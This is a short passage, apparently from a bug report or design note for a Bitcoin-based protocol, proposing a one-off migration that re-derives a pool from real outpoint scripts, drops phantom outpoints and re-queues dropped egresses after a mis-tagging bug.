**Existing damage:** any already-mis-tagged records need a one-off migration that re-derives the pool from Bitcoin (the outpoints' real scripts), drops phantom outpoints, and re-queues dropped egresses: the same machinery the protocol ships for routine hotfixes (2.2.14 itself is one).
